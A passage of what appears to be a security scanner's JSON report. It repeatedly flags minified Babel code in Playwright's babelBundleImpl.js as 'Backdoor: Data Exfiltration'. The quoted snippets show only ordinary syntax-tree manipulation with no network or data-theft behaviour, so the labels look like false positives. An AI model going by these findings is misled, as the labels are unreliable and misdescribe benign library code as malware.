                      "markdown": "`ion sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveBreak:!0,shouldPopulateBreak:!1,inCaseClause:!`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 32796,
                  "endLine": 66,
                  "endColumn": 32801,
                  "snippet": {
                    "text": "aration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveB",
                    "rendered": {
                      "text": "aration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveB",
                      "markdown": "`aration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"cases\"),r,t);if(e.isSwitchCase())return dC(e.get(\"consequent\"),{canHaveB`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 32728,
                  "endLine": 66,
                  "endColumn": 32733,
                  "snippet": {
                    "text": " s=sa(e[n],t);if(s.length>1||s.length===1&&!s[0].path.isVariableDeclaration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"case",
                    "rendered": {
                      "text": " s=sa(e[n],t);if(s.length>1||s.length===1&&!s[0].path.isVariableDeclaration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"case",
                      "markdown": "` s=sa(e[n],t);if(s.length>1||s.length===1&&!s[0].path.isVariableDeclaration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"),r,t);else{if(e.isCatchClause())return na(e.get(\"body\"),r,t);if(e.isSwitchStatement())return Que(e.get(\"case`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 32619,
                  "endLine": 66,
                  "endColumn": 32624,
                  "snippet": {
                    "text": "t u=o[l];u.type===_o&&r.push(u),u.type===h0&&n.push(u)}}}}else if(e.length)for(let n=e.length-1;n>=0;n--){let s=sa(e[n],t);if(s.length>1||s.length===1&&!s[0].path.isVariableDeclaration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"",
                    "rendered": {
                      "text": "t u=o[l];u.type===_o&&r.push(u),u.type===h0&&n.push(u)}}}}else if(e.length)for(let n=e.length-1;n>=0;n--){let s=sa(e[n],t);if(s.length>1||s.length===1&&!s[0].path.isVariableDeclaration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"",
                      "markdown": "`t u=o[l];u.type===_o&&r.push(u),u.type===h0&&n.push(u)}}}}else if(e.length)for(let n=e.length-1;n>=0;n--){let s=sa(e[n],t);if(s.length>1||s.length===1&&!s[0].path.isVariableDeclaration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"block\"),r,t),r=na(e.get(\"handler\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 32589,
                  "endLine": 66,
                  "endColumn": 32594,
                  "snippet": {
                    "text": "for(let l=0;l<o.length;l++){let u=o[l];u.type===_o&&r.push(u),u.type===h0&&n.push(u)}}}}else if(e.length)for(let n=e.length-1;n>=0;n--){let s=sa(e[n],t);if(s.length>1||s.length===1&&!s[0].path.isVariableDeclaration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"blo",
                    "rendered": {
                      "text": "for(let l=0;l<o.length;l++){let u=o[l];u.type===_o&&r.push(u),u.type===h0&&n.push(u)}}}}else if(e.length)for(let n=e.length-1;n>=0;n--){let s=sa(e[n],t);if(s.length>1||s.length===1&&!s[0].path.isVariableDeclaration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"blo",
                      "markdown": "`for(let l=0;l<o.length;l++){let u=o[l];u.type===_o&&r.push(u),u.type===h0&&n.push(u)}}}}else if(e.length)for(let n=e.length-1;n>=0;n--){let s=sa(e[n],t);if(s.length>1||s.length===1&&!s[0].path.isVariableDeclaration()){r.push(...s);break}}return r}function sa(e,t){let r=[];if(e.isIfStatement())r=na(e.get(\"consequent\"),r,t),r=na(e.get(\"alternate\"),r,t);else{if(e.isDoExpression()||e.isFor()||e.isWhile()||e.isLabeledStatement())return na(e.get(\"body\"),r,t);if(e.isProgram()||e.isBlockStatement())return dC(e.get(\"body\"),t);if(e.isFunction())return sa(e.get(\"body\"),t);if(e.isTryStatement())r=na(e.get(\"blo`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 30372,
                  "endLine": 66,
                  "endColumn": 30377,
                  "snippet": {
                    "text": "turn this._assertUnremoved(),t=this._verifyNodeList(t),f0.default.get({parentPath:this,parent:this.node,container:this.node[e],listKey:e,key:0}).setContext(this.context)._containerInsertBefore(t)}function Vue(e,t){this._assertUnremoved();let r=this._verifyNodeList(t),n=this.node[e];return f0.default.get({parentPath:this,parent:this.node,container:n,listKey:e,key:n.length}).setContext(this.context).replaceWithMultiple(r)}function $ue(e=this.scope){return new vue.default(this,e).run()}});var mC=E(er=>{\"use strict\";Object.defineProperty(er,\"__esModule\",{value:!0});er._getKey=oce;er._getPattern=lce;er.",
                    "rendered": {
                      "text": "turn this._assertUnremoved(),t=this._verifyNodeList(t),f0.default.get({parentPath:this,parent:this.node,container:this.node[e],listKey:e,key:0}).setContext(this.context)._containerInsertBefore(t)}function Vue(e,t){this._assertUnremoved();let r=this._verifyNodeList(t),n=this.node[e];return f0.default.get({parentPath:this,parent:this.node,container:n,listKey:e,key:n.length}).setContext(this.context).replaceWithMultiple(r)}function $ue(e=this.scope){return new vue.default(this,e).run()}});var mC=E(er=>{\"use strict\";Object.defineProperty(er,\"__esModule\",{value:!0});er._getKey=oce;er._getPattern=lce;er.",
                      "markdown": "`turn this._assertUnremoved(),t=this._verifyNodeList(t),f0.default.get({parentPath:this,parent:this.node,container:this.node[e],listKey:e,key:0}).setContext(this.context)._containerInsertBefore(t)}function Vue(e,t){this._assertUnremoved();let r=this._verifyNodeList(t),n=this.node[e];return f0.default.get({parentPath:this,parent:this.node,container:n,listKey:e,key:n.length}).setContext(this.context).replaceWithMultiple(r)}function $ue(e=this.scope){return new vue.default(this,e).run()}});var mC=E(er=>{\"use strict\";Object.defineProperty(er,\"__esModule\",{value:!0});er._getKey=oce;er._getPattern=lce;er.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 30137,
                  "endLine": 66,
                  "endColumn": 30142,
                  "snippet": {
                    "text": "n=\"has a NodePath when it expected a raw object\"):n=\"without a type\":n=\"has falsy node\",n){let s=Array.isArray(r)?\"array\":typeof r;throw new Error(`Node list ${n} with the index of ${t} and type of ${s}`)}}return e}function Uue(e,t){return this._assertUnremoved(),t=this._verifyNodeList(t),f0.default.get({parentPath:this,parent:this.node,container:this.node[e],listKey:e,key:0}).setContext(this.context)._containerInsertBefore(t)}function Vue(e,t){this._assertUnremoved();let r=this._verifyNodeList(t),n=this.node[e];return f0.default.get({parentPath:this,parent:this.node,container:n,listKey:e,key:n.len",
                    "rendered": {
                      "text": "n=\"has a NodePath when it expected a raw object\"):n=\"without a type\":n=\"has falsy node\",n){let s=Array.isArray(r)?\"array\":typeof r;throw new Error(`Node list ${n} with the index of ${t} and type of ${s}`)}}return e}function Uue(e,t){return this._assertUnremoved(),t=this._verifyNodeList(t),f0.default.get({parentPath:this,parent:this.node,container:this.node[e],listKey:e,key:0}).setContext(this.context)._containerInsertBefore(t)}function Vue(e,t){this._assertUnremoved();let r=this._verifyNodeList(t),n=this.node[e];return f0.default.get({parentPath:this,parent:this.node,container:n,listKey:e,key:n.len",
                      "markdown": "`n=\"has a NodePath when it expected a raw object\"):n=\"without a type\":n=\"has falsy node\",n){let s=Array.isArray(r)?\"array\":typeof r;throw new Error(`Node list ${n} with the index of ${t} and type of ${s}`)}}return e}function Uue(e,t){return this._assertUnremoved(),t=this._verifyNodeList(t),f0.default.get({parentPath:this,parent:this.node,container:this.node[e],listKey:e,key:0}).setContext(this.context)._containerInsertBefore(t)}function Vue(e,t){this._assertUnremoved();let r=this._verifyNodeList(t),n=this.node[e];return f0.default.get({parentPath:this,parent:this.node,container:n,listKey:e,key:n.len`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 28726,
                  "endLine": 66,
                  "endColumn": 28731,
                  "snippet": {
                    "text": "s.isDeclaration())return r.insertAfter(t.map(s=>Due(s)?c0(s):s));if(this.isNodeType(\"Expression\")&&!this.isJSXElement()&&!r.isJSXElement()||r.isForStatement()&&this.key===\"init\"){if(this.node){let s=this.node,{scope:i}=this;if(i.path.isPattern())return xue(s),this.replaceWith(Aue(Sue([],s),[])),this.get(\"callee.body\").insertAfter(t),[this];if(fC(this))t.unshift(s);else if(wue(s)&&_ue(s.callee))t.unshift(s),t.push(Nue());else if(Lue(s,i))t.unshift(s),t.push(u0(s.left));else if(i.isPure(s,!0))t.push(s);else{r.isMethod({computed:!0,key:s})&&(i=i.parent);let a=i.generateDeclaredUidIdentifier();t.unshif",
                    "rendered": {
                      "text": "s.isDeclaration())return r.insertAfter(t.map(s=>Due(s)?c0(s):s));if(this.isNodeType(\"Expression\")&&!this.isJSXElement()&&!r.isJSXElement()||r.isForStatement()&&this.key===\"init\"){if(this.node){let s=this.node,{scope:i}=this;if(i.path.isPattern())return xue(s),this.replaceWith(Aue(Sue([],s),[])),this.get(\"callee.body\").insertAfter(t),[this];if(fC(this))t.unshift(s);else if(wue(s)&&_ue(s.callee))t.unshift(s),t.push(Nue());else if(Lue(s,i))t.unshift(s),t.push(u0(s.left));else if(i.isPure(s,!0))t.push(s);else{r.isMethod({computed:!0,key:s})&&(i=i.parent);let a=i.generateDeclaredUidIdentifier();t.unshif",
                      "markdown": "`s.isDeclaration())return r.insertAfter(t.map(s=>Due(s)?c0(s):s));if(this.isNodeType(\"Expression\")&&!this.isJSXElement()&&!r.isJSXElement()||r.isForStatement()&&this.key===\"init\"){if(this.node){let s=this.node,{scope:i}=this;if(i.path.isPattern())return xue(s),this.replaceWith(Aue(Sue([],s),[])),this.get(\"callee.body\").insertAfter(t),[this];if(fC(this))t.unshift(s);else if(wue(s)&&_ue(s.callee))t.unshift(s),t.push(Nue());else if(Lue(s,i))t.unshift(s),t.push(u0(s.left));else if(i.isPure(s,!0))t.push(s);else{r.isMethod({computed:!0,key:s})&&(i=i.parent);let a=i.generateDeclaredUidIdentifier();t.unshif`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 28235,
                  "endLine": 66,
                  "endColumn": 28240,
                  "snippet": {
                    "text": "t.expressions)!==e.node||fC(e.parentPath))}function Lue(e,t){if(!Cue(e)||!Iue(e.left))return!1;let r=t.getBlockParent();return r.hasOwnBinding(e.left.name)&&r.getOwnBinding(e.left.name).constantViolations.length<=1}function Mue(e){if(this._assertUnremoved(),this.isSequenceExpression())return cC(this.get(\"expressions\")).insertAfter(e);let t=this._verifyNodeList(e),{parentPath:r,parent:n}=this;if(r.isExpressionStatement()||r.isLabeledStatement()||uC(n)||r.isExportDefaultDeclaration()&&this.isDeclaration())return r.insertAfter(t.map(s=>Due(s)?c0(s):s));if(this.isNodeType(\"Expression\")&&!this.isJSXElem",
                    "rendered": {
                      "text": "t.expressions)!==e.node||fC(e.parentPath))}function Lue(e,t){if(!Cue(e)||!Iue(e.left))return!1;let r=t.getBlockParent();return r.hasOwnBinding(e.left.name)&&r.getOwnBinding(e.left.name).constantViolations.length<=1}function Mue(e){if(this._assertUnremoved(),this.isSequenceExpression())return cC(this.get(\"expressions\")).insertAfter(e);let t=this._verifyNodeList(e),{parentPath:r,parent:n}=this;if(r.isExpressionStatement()||r.isLabeledStatement()||uC(n)||r.isExportDefaultDeclaration()&&this.isDeclaration())return r.insertAfter(t.map(s=>Due(s)?c0(s):s));if(this.isNodeType(\"Expression\")&&!this.isJSXElem",
                      "markdown": "`t.expressions)!==e.node||fC(e.parentPath))}function Lue(e,t){if(!Cue(e)||!Iue(e.left))return!1;let r=t.getBlockParent();return r.hasOwnBinding(e.left.name)&&r.getOwnBinding(e.left.name).constantViolations.length<=1}function Mue(e){if(this._assertUnremoved(),this.isSequenceExpression())return cC(this.get(\"expressions\")).insertAfter(e);let t=this._verifyNodeList(e),{parentPath:r,parent:n}=this;if(r.isExpressionStatement()||r.isLabeledStatement()||uC(n)||r.isExportDefaultDeclaration()&&this.isDeclaration())return r.insertAfter(t.map(s=>Due(s)?c0(s):s));if(this.isNodeType(\"Expression\")&&!this.isJSXElem`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 25905,
                  "endLine": 66,
                  "endColumn": 25910,
                  "snippet": {
                    "text": "ref\"),n=gue(r,this.path.node),s=this.attachAfter?\"insertAfter\":\"insertBefore\",[i]=t[s]([t.isVariableDeclarator()?n:yue(\"var\",[n])]),a=this.path.parentPath;return a.isJSXElement()&&this.path.container===a.node.children&&(r=mue(r)),this.path.replaceWith(hue(r)),t.isVariableDeclarator()?i.get(\"init\"):i.get(\"declarations.0.init\")}};sc.default=l0});var pC=E(Rr=>{\"use strict\";Object.defineProperty(Rr,\"__esModule\",{value:!0});Rr._containerInsert=Bue;Rr._containerInsertAfter=jue;Rr._containerInsertBefore=Fue;Rr._verifyNodeList=que;Rr.hoist=$ue;Rr.insertAfter=Mue;Rr.insertBefore=kue;Rr.pushContainer=Vue;Rr.",
                    "rendered": {
                      "text": "ref\"),n=gue(r,this.path.node),s=this.attachAfter?\"insertAfter\":\"insertBefore\",[i]=t[s]([t.isVariableDeclarator()?n:yue(\"var\",[n])]),a=this.path.parentPath;return a.isJSXElement()&&this.path.container===a.node.children&&(r=mue(r)),this.path.replaceWith(hue(r)),t.isVariableDeclarator()?i.get(\"init\"):i.get(\"declarations.0.init\")}};sc.default=l0});var pC=E(Rr=>{\"use strict\";Object.defineProperty(Rr,\"__esModule\",{value:!0});Rr._containerInsert=Bue;Rr._containerInsertAfter=jue;Rr._containerInsertBefore=Fue;Rr._verifyNodeList=que;Rr.hoist=$ue;Rr.insertAfter=Mue;Rr.insertBefore=kue;Rr.pushContainer=Vue;Rr.",
                      "markdown": "`ref\"),n=gue(r,this.path.node),s=this.attachAfter?\"insertAfter\":\"insertBefore\",[i]=t[s]([t.isVariableDeclarator()?n:yue(\"var\",[n])]),a=this.path.parentPath;return a.isJSXElement()&&this.path.container===a.node.children&&(r=mue(r)),this.path.replaceWith(hue(r)),t.isVariableDeclarator()?i.get(\"init\"):i.get(\"declarations.0.init\")}};sc.default=l0});var pC=E(Rr=>{\"use strict\";Object.defineProperty(Rr,\"__esModule\",{value:!0});Rr._containerInsert=Bue;Rr._containerInsertAfter=jue;Rr._containerInsertBefore=Fue;Rr._verifyNodeList=que;Rr.hoist=$ue;Rr.insertAfter=Mue;Rr.insertBefore=kue;Rr.pushContainer=Vue;Rr.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 25891,
                  "endLine": 66,
                  "endColumn": 25896,
                  "snippet": {
                    "text": "idIdentifier(\"ref\"),n=gue(r,this.path.node),s=this.attachAfter?\"insertAfter\":\"insertBefore\",[i]=t[s]([t.isVariableDeclarator()?n:yue(\"var\",[n])]),a=this.path.parentPath;return a.isJSXElement()&&this.path.container===a.node.children&&(r=mue(r)),this.path.replaceWith(hue(r)),t.isVariableDeclarator()?i.get(\"init\"):i.get(\"declarations.0.init\")}};sc.default=l0});var pC=E(Rr=>{\"use strict\";Object.defineProperty(Rr,\"__esModule\",{value:!0});Rr._containerInsert=Bue;Rr._containerInsertAfter=jue;Rr._containerInsertBefore=Fue;Rr._verifyNodeList=que;Rr.hoist=$ue;Rr.insertAfter=Mue;Rr.insertBefore=kue;Rr.pushCon",
                    "rendered": {
                      "text": "idIdentifier(\"ref\"),n=gue(r,this.path.node),s=this.attachAfter?\"insertAfter\":\"insertBefore\",[i]=t[s]([t.isVariableDeclarator()?n:yue(\"var\",[n])]),a=this.path.parentPath;return a.isJSXElement()&&this.path.container===a.node.children&&(r=mue(r)),this.path.replaceWith(hue(r)),t.isVariableDeclarator()?i.get(\"init\"):i.get(\"declarations.0.init\")}};sc.default=l0});var pC=E(Rr=>{\"use strict\";Object.defineProperty(Rr,\"__esModule\",{value:!0});Rr._containerInsert=Bue;Rr._containerInsertAfter=jue;Rr._containerInsertBefore=Fue;Rr._verifyNodeList=que;Rr.hoist=$ue;Rr.insertAfter=Mue;Rr.insertBefore=kue;Rr.pushCon",
                      "markdown": "`idIdentifier(\"ref\"),n=gue(r,this.path.node),s=this.attachAfter?\"insertAfter\":\"insertBefore\",[i]=t[s]([t.isVariableDeclarator()?n:yue(\"var\",[n])]),a=this.path.parentPath;return a.isJSXElement()&&this.path.container===a.node.children&&(r=mue(r)),this.path.replaceWith(hue(r)),t.isVariableDeclarator()?i.get(\"init\"):i.get(\"declarations.0.init\")}};sc.default=l0});var pC=E(Rr=>{\"use strict\";Object.defineProperty(Rr,\"__esModule\",{value:!0});Rr._containerInsert=Bue;Rr._containerInsertAfter=jue;Rr._containerInsertBefore=Fue;Rr._verifyNodeList=que;Rr.hoist=$ue;Rr.insertAfter=Mue;Rr.insertBefore=kue;Rr.pushCon`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 24778,
                  "endLine": 66,
                  "endColumn": 24783,
                  "snippet": {
                    "text": "s.path).key>=t.key){this.attachAfter=!0,t=s.path;for(let a of s.constantViolations)this.getAttachmentParentForPath(a).key>t.key&&(t=a)}}return t}_getAttachmentPath(){let r=this.scopes.pop();if(r){if(r.path.isFunction())if(this.hasOwnParamBindings(r)){if(this.scope===r)return;let n=r.path.get(\"body\").get(\"body\");for(let s=0;s<n.length;s++)if(!n[s].node._blockHoist)return n[s]}else return this.getNextScopeAttachmentParent();else if(r.path.isProgram())return this.getNextScopeAttachmentParent()}}getNextScopeAttachmentParent(){let t=this.scopes.pop();if(t)return this.getAttachmentParentForPath(t.path)}g",
                    "rendered": {
                      "text": "s.path).key>=t.key){this.attachAfter=!0,t=s.path;for(let a of s.constantViolations)this.getAttachmentParentForPath(a).key>t.key&&(t=a)}}return t}_getAttachmentPath(){let r=this.scopes.pop();if(r){if(r.path.isFunction())if(this.hasOwnParamBindings(r)){if(this.scope===r)return;let n=r.path.get(\"body\").get(\"body\");for(let s=0;s<n.length;s++)if(!n[s].node._blockHoist)return n[s]}else return this.getNextScopeAttachmentParent();else if(r.path.isProgram())return this.getNextScopeAttachmentParent()}}getNextScopeAttachmentParent(){let t=this.scopes.pop();if(t)return this.getAttachmentParentForPath(t.path)}g",
                      "markdown": "`s.path).key>=t.key){this.attachAfter=!0,t=s.path;for(let a of s.constantViolations)this.getAttachmentParentForPath(a).key>t.key&&(t=a)}}return t}_getAttachmentPath(){let r=this.scopes.pop();if(r){if(r.path.isFunction())if(this.hasOwnParamBindings(r)){if(this.scope===r)return;let n=r.path.get(\"body\").get(\"body\");for(let s=0;s<n.length;s++)if(!n[s].node._blockHoist)return n[s]}else return this.getNextScopeAttachmentParent();else if(r.path.isProgram())return this.getNextScopeAttachmentParent()}}getNextScopeAttachmentParent(){let t=this.scopes.pop();if(t)return this.getAttachmentParentForPath(t.path)}g`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
